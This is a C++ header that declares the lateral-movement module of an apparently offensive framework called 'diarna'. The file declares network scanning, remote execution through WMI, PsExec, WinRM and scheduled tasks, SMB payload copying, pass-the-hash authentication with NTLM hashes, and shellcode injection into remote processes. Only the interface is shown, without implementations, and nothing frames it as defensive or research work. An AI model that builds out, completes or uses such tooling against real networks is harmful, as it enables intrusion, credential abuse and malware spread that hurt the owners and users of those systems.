#pragma once
#include <diarna/compiler_port.hpp>
#include <string>
#include <vector>
#include <cstdint>
#include <span>

namespace diarna::movement {

class LateralMovement {
public:
    LateralMovement() = default;
    ~LateralMovement() = default;

    struct Target {
        std::string hostname;
        std::string ip;
        bool alive = false;
        uint32_t ping_ms = 0;
        bool smb_open = false;
        bool rdp_open = false;
        bool winrm_open = false;
        bool ssh_open = false;
    };

    std::vector<Target> scan_network(const std::string& subnet = "192.168.1.0/24",
                                      uint32_t timeout_ms = 500);

    bool wmi_exec(const std::string& target, const std::string& command,
                  const std::string& user = "", const std::string& pass = "");

    bool psexec_exec(const std::string& target, const std::wstring& binary_path,
                     const std::string& user = "", const std::string& pass = "");

    bool winrm_exec(const std::string& target, const std::string& script,
                    const std::string& user = "", const std::string& pass = "");

    bool schedule_task_remote(const std::string& target,
                              const std::wstring& local_payload,
                              const std::string& user = "",
                              const std::string& pass = "");

    bool smb_copy(const std::string& target,
                  const std::wstring& local_path,
                  const std::wstring& remote_path,
                  const std::string& user = "",
                  const std::string& pass = "");

    bool pass_the_hash(const std::string& target,
                       const std::string& hash,
                       const std::wstring& command);

    struct Credential {
        std::string username;
        std::string password;
        std::string domain;
        std::string ntlm_hash;
    };

    bool inject_into_remote_process(const std::string& target,
                                     uint32_t pid,
                                     std::span<const uint8_t> shellcode);

private:
    uint32_t ip_to_uint(const std::string& ip);
    std::string uint_to_ip(uint32_t ip);
    bool tcp_connect(const std::string& ip, uint16_t port, uint32_t timeout_ms);
    bool ping_host(const std::string& ip);
};

} // namespace diarna::movement
